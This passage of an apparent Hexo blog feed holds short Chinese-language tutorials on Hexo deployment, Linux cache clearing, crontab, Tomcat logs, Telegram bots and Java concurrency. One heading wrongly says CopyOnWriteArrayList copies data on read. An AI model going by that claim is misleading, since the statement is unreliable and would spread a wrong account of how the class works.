class="line">hexo new my_first_post</span><br></pre></td></tr></table></figure><br>Step11:產生靜態檔案<br>   啟動local server , default port 4000<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><br>   更換port<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo server -p 5000 來更換port</span><br></pre></td></tr></table></figure><br>Step12:在\blog下找到配置文件_config.yml<br>   Step12.1:修改deploy配置<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line"><span class="built_in">type</span>: git</span><br><span class="line">repository: http://github.com/用戶名/用戶名.github.io.git</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><br>Step13:部署至GitHub<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><br>   hexo d (這步如有出現ERROR Deployer not found: git錯誤),在\blog下安裝<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><br>Step14:在browser輸入 “UserName”.github.io 即可看到Blog</p>
<p>References <span class="exturl" data-url="aHR0cHM6Ly9qdW55b3UudHcvaGV4by8=">使用 Hexo 在 Github 建立部落格<i class="fa fa-external-link-alt"></i></span><br>References <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxODA4OTYxL2FydGljbGUvZGV0YWlscy84NDQ3NjUwNA==">hexo d命令报错 ERROR Deployer not found: git<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>手動清除Linux記憶體快取</title>
    <url>/posts/da38d0c2/</url>
    <content><![CDATA[<h3 id="手動清除Linux記憶體快取"><a href="#手動清除Linux記憶體快取" class="headerlink" title="手動清除Linux記憶體快取"></a>手動清除Linux記憶體快取</h3><span id="more"></span>
<p>這篇介紹手動清除Linux記憶體快取。</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">最近在Linux上執行將<span class="built_in">log</span>打包成.tar.gz時</span><br><span class="line">出現memory over 80%告警</span><br><span class="line">--------------------------------------</span><br><span class="line">Linux 中提供了 free 指令可以觀察系統中記憶體的使用情況，</span><br><span class="line">觀察後發現跑完一次 .tar.gz 後被快取的記憶體多了不少，</span><br><span class="line">且這些 cache 並不會隨著 process 的結束而馬上被清理掉。</span><br></pre></td></tr></table></figure>

<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Linux 有提供一個 proc file system 介面 /proc/sys/vm/drop_caches 可以強制 kernel 清理快取。</span><br><span class="line">若有這樣的需求，我們只需要對這個 file 寫入 1~3 這三種控制碼其中一種，</span><br><span class="line">對應的記憶體快取種類便會被強制清理。</span><br><span class="line">--</span><br><span class="line">若寫入 1 會清除 pagecache：</span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/vm/drop_caches</span></span><br><span class="line">若寫入 2 會清除 dentries 與 inodes：</span><br><span class="line"><span class="comment"># echo 2 &gt; /proc/sys/vm/drop_caches</span></span><br><span class="line">若寫入 3 則有等同於 1+2 的效果，會清除 pagecache、dentries 及 inodes：</span><br><span class="line"><span class="comment"># echo 3 &gt; /proc/sys/vm/drop_caches</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>設定Linux重開機執行sh</title>
    <url>/posts/98677913/</url>
    <content><![CDATA[<h3 id="設定Linux重開機執行sh"><a href="#設定Linux重開機執行sh" class="headerlink" title="設定Linux重開機執行sh"></a>設定Linux重開機執行sh</h3><span id="more"></span>
<p>這篇介紹在Linux上設定reboot執行sh檔案。</p>
<h3 id="crontab-setting"><a href="#crontab-setting" class="headerlink" title="crontab setting"></a>crontab setting</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@reboot sh /home/test/startProgram.sh &gt; /home/test/startProgram.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<h3 id="startProgram-sh"><a href="#startProgram-sh" class="headerlink" title="startProgram.sh"></a>startProgram.sh</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">開機後兩分鐘執行另外一支.sh</span><br><span class="line"><span class="built_in">sleep</span> 2m</span><br><span class="line"><span class="built_in">cd</span> /home/test/1</span><br><span class="line">sh start1.sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>自訂Tomcat的localhost_access_log</title>
    <url>/posts/24ecedfc/</url>
    <content><![CDATA[<h3 id="自訂Tomcat的localhost-access-log"><a href="#自訂Tomcat的localhost-access-log" class="headerlink" title="自訂Tomcat的localhost_access_log"></a>自訂Tomcat的localhost_access_log</h3><span id="more"></span>
<h3 id="預設格式"><a href="#預設格式" class="headerlink" title="預設格式"></a>預設格式</h3><p>Tomcat預設的localhost_access_log格式為</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;Valve className=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> directory=<span class="string">&quot;logs&quot;</span> prefix=<span class="string">&quot;localhost_access_log.&quot;</span> suffix=<span class="string">&quot;.txt&quot;</span> pattern=<span class="string">&quot;common&quot;</span> resolveHosts=<span class="string">&quot;false&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
<h3 id="可自定義欄位"><a href="#可自定義欄位" class="headerlink" title="可自定義欄位"></a>可自定義欄位</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">%a - Remote IP address</span><br><span class="line">%A - Local IP address</span><br><span class="line">%b - Bytes sent, excluding HTTP headers, or <span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> zero</span><br><span class="line">%B - Bytes sent, excluding HTTP headers</span><br><span class="line">%h - Remote host name (or IP address <span class="keyword">if</span> resolveHosts is <span class="literal">false</span>)</span><br><span class="line">%H - Request protocol</span><br><span class="line">%l - Remote logical username from identd (always returns <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">%m - Request method (GET, POST, etc.)</span><br><span class="line">%p - Local port on <span class="built_in">which</span> this request was received</span><br><span class="line">%q - Query string (prepended with a <span class="string">&#x27;?&#x27;</span> <span class="keyword">if</span> it exists)</span><br><span class="line">%r - First line of the request (method and request URI)</span><br><span class="line">%s - HTTP status code of the response</span><br><span class="line">%S - User session ID</span><br><span class="line">%t - Date and time, <span class="keyword">in</span> Common Log Format</span><br><span class="line">%u - Remote user that was authenticated (<span class="keyword">if</span> any), <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">%U - Requested URL path</span><br><span class="line">%v - Local server name</span><br><span class="line">%D - Time taken to process the request, <span class="keyword">in</span> millis</span><br><span class="line">%T - Time taken to process the request, <span class="keyword">in</span> seconds</span><br><span class="line">%I - current request thread name (can compare later with stacktraces)</span><br></pre></td></tr></table></figure>
<p>若要修改localhost_access_log格式，需修改&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;server.xml檔案如下</p>
<h3 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;Valve className=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> directory=<span class="string">&quot;logs&quot;</span> prefix=<span class="string">&quot;localhost_access_log&quot;</span> suffix=<span class="string">&quot;.txt&quot;</span> pattern=<span class="string">&quot;%S %h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">- 10.10.100.1 - - [13/Mar/2020:15:33:37 +0800] <span class="string">&quot;POST /api/Servlet HTTP/1.1&quot;</span> 200 23</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>localhost_access_log</tag>
      </tags>
  </entry>
  <entry>
    <title>踩坑日記-三元運算子</title>
    <url>/posts/82b731f3/</url>
    <content><![CDATA[<h3 id="踩坑日記-三元運算子"><a href="#踩坑日記-三元運算子" class="headerlink" title="踩坑日記-三元運算子"></a>踩坑日記-三元運算子</h3><span id="more"></span>
<p>這篇紀錄運算子，在使用上可能會遇到的坑，避免再次踩坑。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">String message = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">message == null ? <span class="string">&quot;&#123;&#125;&quot;</span> : message</span><br><span class="line"></span><br><span class="line">Error exmaple:</span><br><span class="line">StringBuilder out = new StringBuilder(<span class="string">&quot;[Message]:&quot;</span> + message == null ? <span class="string">&quot;&#123;&#125;&quot;</span> : message);</span><br><span class="line">System.out.println(out.toString());</span><br><span class="line">Output:123</span><br><span class="line"></span><br><span class="line">Correct exmaple:</span><br><span class="line">StringBuilder out = new StringBuilder(<span class="string">&quot;[Message]:&quot;</span> + (message == null ? <span class="string">&quot;&#123;&#125;&quot;</span> : message));</span><br><span class="line">System.out.println(out.toString());</span><br><span class="line">Output:[Message]:123</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ternary Operators</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Ternary Operators</tag>
      </tags>
  </entry>
  <entry>
    <title>申請TelegramBot教學</title>
    <url>/posts/49691633/</url>
    <content><![CDATA[<h3 id="申請TelegramBot教學"><a href="#申請TelegramBot教學" class="headerlink" title="申請TelegramBot教學"></a>申請TelegramBot教學</h3><span id="more"></span>
<p>Step1:前置作業:需安裝及申請Telegram帳號。(網路上有許多教學)<br>Step2:用搜尋方式找到申請Bot的帳號:【BotFather】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">申請對話流程如下:</span><br><span class="line"></span><br><span class="line">申請人: /newBot</span><br><span class="line"></span><br><span class="line">BotFather: Alright, a new bot. How are we going to call it? Please choose a name <span class="keyword">for</span> your bot.</span><br><span class="line"></span><br><span class="line">申請人: 輸入欲設定的bot name</span><br><span class="line"></span><br><span class="line">BotFather: Good. Now <span class="built_in">let</span><span class="string">&#x27;s choose a username for your bot. It must end in `bot`. Like this, for example: TetrisBot or tetris_bot.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">申請人: 輸入欲設定的bot的username (結尾一定要有bot，這也是未來被搜尋的name)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">BotFather: </span></span><br><span class="line"><span class="string">Response1 - Sorry, this username is already taken. Please try something different. (username與他人重覆)</span></span><br><span class="line"><span class="string">Response2 - Done! Congratulations on your new bot. You will find it at telegram.me/xxxbot. </span></span><br><span class="line"><span class="string">You can now add a description, about section and profile picture for your bot, see /help for a list of commands.</span></span><br><span class="line"><span class="string">By the way, when you&#x27;</span>ve finished creating your cool bot, ping our Bot Support <span class="keyword">if</span> you want a better username <span class="keyword">for</span> it..</span><br><span class="line">Just make sure the bot is fully operational before you <span class="keyword">do</span> this.</span><br><span class="line"></span><br><span class="line">Use this token to access the HTTP API:</span><br><span class="line">【這邊會顯示Token】</span><br><span class="line"></span><br><span class="line">For a description of the Bot API, see this page: https://core.telegram.org/bots/api</span><br></pre></td></tr></table></figure>
<p>Step3:建立一個Telegram群組，將設定好的bot加入群組(並設置為admin)。<br>Step4:打開瀏覽器使用 <span class="exturl" data-url="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCU3QnRva2VuJTdEL2dldFVwZGF0ZXM=">https://api.telegram.org/bot{token}/getUpdates<i class="fa fa-external-link-alt"></i></span> ，在回傳的訊息中，就可以看到chatid。<br>Step5:透過Telegram api : sendmessage，測試傳遞訊息，<span class="exturl" data-url="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCU3QnRva2VuJTdEL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JTdCY2hhdGlkJTdEJnRleHQ9JTdCJUU4JUE4JThBJUU2JTgxJUFGJTdEJUUzJTgwJTgy">https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&amp;text={訊息}。<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>TelegramBot</category>
      </categories>
      <tags>
        <tag>TelegramBot</tag>
      </tags>
  </entry>
  <entry>
    <title>關於/etc/hosts設定和traceroute語法在linux與windows差異</title>
    <url>/posts/e65fd773/</url>
    <content><![CDATA[<h3 id="關於-x2F-etc-x2F-hosts設定和traceroute語法在linux與windows差異"><a href="#關於-x2F-etc-x2F-hosts設定和traceroute語法在linux與windows差異" class="headerlink" title="關於&#x2F;etc&#x2F;hosts設定和traceroute語法在linux與windows差異"></a>關於&#x2F;etc&#x2F;hosts設定和traceroute語法在linux與windows差異</h3><span id="more"></span>

<h3 id="x2F-etc-x2F-hosts-在-Linux"><a href="#x2F-etc-x2F-hosts-在-Linux" class="headerlink" title="&#x2F;etc&#x2F;hosts 在 Linux"></a>&#x2F;etc&#x2F;hosts 在 Linux</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$vim</span> /etc/hosts</span><br></pre></td></tr></table></figure>

<h3 id="x2F-etc-x2F-hosts-在-Windows"><a href="#x2F-etc-x2F-hosts-在-Windows" class="headerlink" title="&#x2F;etc&#x2F;hosts 在 Windows"></a>&#x2F;etc&#x2F;hosts 在 Windows</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<h3 id="traceroute-在-Linux"><a href="#traceroute-在-Linux" class="headerlink" title="traceroute 在 Linux"></a>traceroute 在 Linux</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$traceroute</span> <span class="string">&#x27;URL&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="traceroute-在-Windows"><a href="#traceroute-在-Windows" class="headerlink" title="traceroute 在 Windows"></a>traceroute 在 Windows</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tracert <span class="string">&#x27;URL&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hosts</category>
      </categories>
      <tags>
        <tag>traceroute</tag>
      </tags>
  </entry>
  <entry>
    <title>關於 CopyOnWrite ArrayList</title>
    <url>/posts/91463ea9/</url>
    <content><![CDATA[<h3 id="關於CopyOnWriteArrayList"><a href="#關於CopyOnWriteArrayList" class="headerlink" title="關於CopyOnWriteArrayList"></a>關於CopyOnWriteArrayList</h3><span id="more"></span>
<p>當有需要對List同時讀和寫操作時，我們會需要使用CopyOnWriteArrayList。</p>
<h3 id="對ArrayList同時做讀和寫操作時會java-lang-RuntimeException-java-util-ConcurrentModificationException"><a href="#對ArrayList同時做讀和寫操作時會java-lang-RuntimeException-java-util-ConcurrentModificationException" class="headerlink" title="對ArrayList同時做讀和寫操作時會java.lang.RuntimeException: java.util.ConcurrentModificationException"></a>對ArrayList同時做讀和寫操作時會java.lang.RuntimeException: java.util.ConcurrentModificationException</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在程式啟動執行緒時會一邊讀資料一邊寫資料，這樣有可能在執行這支程式的時侯發生 Exception，如下：</span><br><span class="line"></span><br><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.RuntimeException: java.util.ConcurrentModificationException</span><br><span class="line">	at com.company.Main.main(Main.java:24)</span><br><span class="line">Caused by: java.util.ConcurrentModificationException</span><br><span class="line">	at java.util.ArrayList<span class="variable">$Itr</span>.checkForComodification(ArrayList.java:909)</span><br><span class="line">	at java.util.ArrayList<span class="variable">$Itr</span>.next(ArrayList.java:859)</span><br><span class="line">	at com.company.Main.main(Main.java:20)</span><br></pre></td></tr></table></figure>

<h3 id="CopyOnWriteArrayList-是在Read的時侯複製出一份相同的資料內容，這樣就避免了同時讀寫一個-List-遇到的問題"><a href="#CopyOnWriteArrayList-是在Read的時侯複製出一份相同的資料內容，這樣就避免了同時讀寫一個-List-遇到的問題" class="headerlink" title="CopyOnWriteArrayList 是在Read的時侯複製出一份相同的資料內容，這樣就避免了同時讀寫一個 List 遇到的問題"></a>CopyOnWriteArrayList 是在Read的時侯複製出一份相同的資料內容，這樣就避免了同時讀寫一個 List 遇到的問題</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">import java.util.concurrent.CopyOnWriteArrayList;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      final CopyOnWriteArrayList&lt;String&gt; list = new CopyOnWriteArrayList&lt;String&gt;();</span><br><span class="line">      list.add(<span class="string">&quot;a1&quot;</span>);</span><br><span class="line">      list.add(<span class="string">&quot;a2&quot;</span>);</span><br><span class="line">      list.add(<span class="string">&quot;a3&quot;</span>);</span><br><span class="line">      list.add(<span class="string">&quot;a4&quot;</span>);</span><br><span class="line">      list.add(<span class="string">&quot;a5&quot;</span>);</span><br><span class="line">      list.add(<span class="string">&quot;a6&quot;</span>);</span><br><span class="line"></span><br><span class="line">      Thread thread = new Thread(new ThreadExample(list));</span><br><span class="line">      thread.start();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(String s: list) &#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch(Exception e) &#123;</span><br><span class="line">      throw new RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用情境"><a href="#使用情境" class="headerlink" title="使用情境"></a>使用情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用 CopyOnWriteArrayList 適合的使用情境是當資料讀取的次數比寫入的次數還多的時侯，</span><br><span class="line">因為寫入的資料不多 copy 的大小也不會太大，所以在此情況下執行的效能會較好。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Collection</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Java-ExecutorService</title>
    <url>/posts/2b671c8a/</url>
    <content><![CDATA[<h3 id="關於Java-ExecutorService"><a href="#關於Java-ExecutorService" class="headerlink" title="關於Java-ExecutorService"></a>關於Java-ExecutorService</h3><span id="more"></span>
<p>在Java5之後，透過Executor來啟動Thread比用Thread的start()更好。<br>在此功能中，可以很容易控制Thread的啟動、執行和關閉，還可以很容易管理Thread Pool。</p>
<h3 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">class 必須 implements Runnable，並撰寫run() 方法</span><br><span class="line">create java.util.concurrent.ExecutorService 來執行task</span><br></pre></td></tr></table></figure>

<h3 id="ExecutorService"><a href="#ExecutorService" class="headerlink" title="ExecutorService"></a>ExecutorService</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ExecutorService提供了管理终止的方法，以及可追蹤一個或多個非同步task而生成 Future 的方法。 </span><br><span class="line">可以關閉 ExecutorService，這將導致其停止接受新task。</span><br><span class="line">關閉後，執行程序將終止，將會沒有任務在執行，也没有任務在等待執行，並且無法提交新任務。</span><br><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(3);</span><br><span class="line">executorService.execute(new TestRunnable());</span><br><span class="line">executorService.shutdown();</span><br></pre></td></tr></table></figure>

<h3 id="get-task-return-value"><a href="#get-task-return-value" class="headerlink" title="get task return value"></a>get task return value</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Java5後，task分兩種：第一種是class implements Runnable，另一種是class implements Callable。</span><br><span class="line">兩者都可以被ExecutorService執行，但是Runnable task没有<span class="built_in">return</span> value，而Callable task有<span class="built_in">return</span> value。</span><br><span class="line">且Callable的call()方法只能透過ExecutorService的(&lt;T&gt; task) 方法執行，<span class="built_in">return</span> 每一個&lt;T&gt;，是表示task等待完成的 Future&lt;T&gt;。</span><br></pre></td></tr></table></figure>

<h3 id="提供以下方法執行task"><a href="#提供以下方法執行task" class="headerlink" title="提供以下方法執行task"></a>提供以下方法執行task</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.executorService.execute 沒有retuen value</span><br><span class="line">2.executorService.submit  有<span class="built_in">return</span> value</span><br><span class="line">3.executorService.invokeAny(任一task完成即cancel其它task) 和 executorService.invokeAll(必須所有task都完成)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>ExecutorService</tag>
      </tags>
  </entry>
  <entry>
    <title>關於ForkJoin Pool</title>
    <url>/posts/f9f11785/</url>
    <content><![CDATA[<h3 id="關於ForkJoin-Pool"><a href="#關於ForkJoin-Pool" class="headerlink" title="關於ForkJoin Pool"></a>關於ForkJoin Pool</h3><span id="more"></span>
<p>在Java7，實作出與以往不同的thread pool，它實作了working stealing scheduling。<br>概念是將一個大的task，切分成多個中型的task，再把中型的task切分成多個小個task。<br>讓一個團隊每個人可以將小的task完成後，將小的task整合成中的task，再將中的task<br>整合原本大的專案。</p>
<h3 id="Work-Stealing"><a href="#Work-Stealing" class="headerlink" title="Work Stealing"></a>Work Stealing</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ForkJoin Pool是為了解決問題平行化的solution，相較於一般的Thread Pool，大家共用一個queue。</span><br><span class="line">ForkJoin Pool是每個thread有一個自己的queue，而且是雙向的Double-ended queue(deque)。</span><br><span class="line">當一個task進來，他會把一部分的工作fork(切)出來先放到queue的最後面，另外一部分開始做。</span><br><span class="line">當然可能做進去後，發現task還是太大，就會繼續切更小，並再放到queue的最後方。</span><br><span class="line">如此一邊切一邊往下執行，直到task夠小可以直接運算為止。</span><br></pre></td></tr></table></figure>

<h3 id="與傳統Thread-Pool比較"><a href="#與傳統Thread-Pool比較" class="headerlink" title="與傳統Thread Pool比較"></a>與傳統Thread Pool比較</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">其實這是兩種不同的執行策略，分別是producer consumer(thread Pool)跟recursion(ForkJoin Pool)。</span><br><span class="line">前者適合每個task是獨立的，它可以把大事小事都平均分攤在每個thread去執行；後者是透過divide and conquer演算法，用work stealing的方式去執行。</span><br><span class="line"></span><br><span class="line">而ForkJoinPool有一個很大的好處是減少thread因為blocking造成context switching。不管是fork, compute, <span class="built_in">join</span>都幾乎不會blocking(只有<span class="built_in">join</span>少數情況會要等待結果)。</span><br><span class="line">這可以讓thread一直保持running的狀態，一直到時間到了被context switch，而不是自己卡住了造成的context switch。</span><br><span class="line"></span><br><span class="line">但ForkJoinPool對於不可分割的task，並且處理時間差異很大的情境比較不適合，畢竟每個thread都有一個queue。</span><br><span class="line">就很像在大賣場排隊結帳，只要運氣不好排到一個前面卡比較久的task就要等比較久。但是別排又沒有閒到可以把你steal走，那就沒有辦法做到先到先處理的特性了。</span><br></pre></td></tr></table></figure>

<h3 id="Java8-Parallel-Stream"><a href="#Java8-Parallel-Stream" class="headerlink" title="Java8 Parallel Stream"></a>Java8 Parallel Stream</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Java8的Stream API的parallel stream事實上也是用ForkJoinPool，他透過Spliterator來定義怎麼去<span class="built_in">split</span>(或稱fork)你的input data。若執行結果需要collect，就會<span class="built_in">join</span>回最後的result。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>ForkJoinPool</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Java-CountDownLatch</title>
    <url>/posts/e1fde366/</url>
    <content><![CDATA[<h3 id="關於Java-CountDownLatch"><a href="#關於Java-CountDownLatch" class="headerlink" title="關於Java-CountDownLatch"></a>關於Java-CountDownLatch</h3><span id="more"></span>
<p>CountDownLatch 可以看作一個計數器，不過計數是原子操作，<br>也就是說同一時間只有一個執行緒能夠操作該計數器。</p>
<h3 id="常用方法介紹"><a href="#常用方法介紹" class="headerlink" title="常用方法介紹"></a>常用方法介紹</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Public constructors</span><br><span class="line">CountDownLatch(int count)</span><br><span class="line">-------------------</span><br><span class="line">Public methods</span><br><span class="line">void await()</span><br><span class="line">boolean await(long <span class="built_in">timeout</span>, TimeUnit unit)</span><br><span class="line">void countDown()</span><br><span class="line">long getCount()</span><br><span class="line">String toString()</span><br></pre></td></tr></table></figure>

<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private static ExecutorService <span class="built_in">exec</span>;</span><br><span class="line"></span><br><span class="line">public static void <span class="function"><span class="title">setUpBeforeClass</span></span>() &#123;</span><br><span class="line">	<span class="built_in">exec</span> = Executors.newFixedThreadPool(1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">final CountDownLatch latch = new CountDownLatch(13 * 13 * 14 * 13 * 13 * 14);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt;= 12; i++) &#123;</span><br><span class="line">	<span class="keyword">for</span> (int j = 0; j &lt;= 12; j++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (int k = 0; k &lt;= 13; k++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (int l = 0; l &lt;= 12; l++) &#123;</span><br><span class="line">				<span class="keyword">for</span> (int m = 0; m &lt;= 12; m++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (int n = 0; n &lt;= 13; n++) &#123;</span><br><span class="line">						Runnable task = new <span class="function"><span class="title">Runnable</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">							@Override</span><br><span class="line">							public void <span class="function"><span class="title">run</span></span>() &#123;</span><br><span class="line">								try &#123;</span><br><span class="line">									//To <span class="keyword">do</span> something</span><br><span class="line">								&#125; catch (Exception e) &#123;</span><br><span class="line">									LogUtils.error.error(<span class="string">&quot;Failure!!! type:&quot;</span> + <span class="built_in">type</span>, e);</span><br><span class="line">								&#125; finally &#123;</span><br><span class="line">									latch.countDown();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;;</span><br><span class="line">						exec.execute(task);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">latch.await();</span><br><span class="line">System.out.println(<span class="string">&quot;All tasks are already finish!!&quot;</span>);</span><br><span class="line">此例子會使用1000個執行緒跑13 * 13 * 14 * 13 * 13 * 14個task</span><br><span class="line">因為有使用CountDownLatch 每執行一個task會使用latch.countDown();去減1</span><br><span class="line">最後latch.await(); 變成0時就代表所有執行緒皆已完成。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CountDownLatch</tag>
      </tags>
  </entry>
  <entry>
    <title>關於 Java8 Nested loops To Stream</title>
    <url>/posts/9f032796/</url>
    <content><![CDATA[<h3 id="關於Java8NestedloopsToStream"><a href="#關於Java8NestedloopsToStream" class="headerlink" title="關於Java8NestedloopsToStream"></a>關於Java8NestedloopsToStream</h3><span id="more"></span>
<h3 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h3><p>在一個Car物件的list中，Car物件本身有Wheel物件。<br>用兩層迴圈可容易使用條件篩選出符合條件的list。</p>
<h3 id="for迴圈-Example"><a href="#for迴圈-Example" class="headerlink" title="for迴圈 Example"></a>for迴圈 Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List&lt;Car&gt; filteredCars = new ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (Car car : cars) &#123;</span><br><span class="line">    <span class="keyword">for</span> (Wheel wheel : wheels) &#123;</span><br><span class="line">        <span class="keyword">if</span> (car.getColor() == wheel.getColor() &amp;&amp; wheel.isWorking()) &#123;</span><br><span class="line">            filteredCars.add(car);</span><br><span class="line">            <span class="built_in">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> filteredCars;</span><br></pre></td></tr></table></figure>

<h3 id="stream-Example"><a href="#stream-Example" class="headerlink" title="stream Example"></a>stream Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List&lt;Car&gt; filteredCars =</span><br><span class="line">    cars.stream().filter (car -&gt; wheels.stream().anyMatch(wheel -&gt; wheel.getColor() == car.getColor() &amp;&amp; wheel.isWorking()))</span><br><span class="line">        .collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Java 8 stream 出來之前，篩選資料中的資料只能用多個迴圈來處理，若遇到複雜的需求</span><br><span class="line">程式碼會可讀性低及不好維護。</span><br><span class="line">在Java 8 stream出來後，由上方的example就可以了解同一個需求兩種不同寫法的差異。</span><br><span class="line">尤其當條件越多越複雜的時候，Java 8 stream 語法糖會更容易撰寫跟理解。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Stream</tag>
      </tags>
  </entry>
  <entry>
    <title>關於Java繼承用法</title>
    <url>/posts/4d02871b/</url>
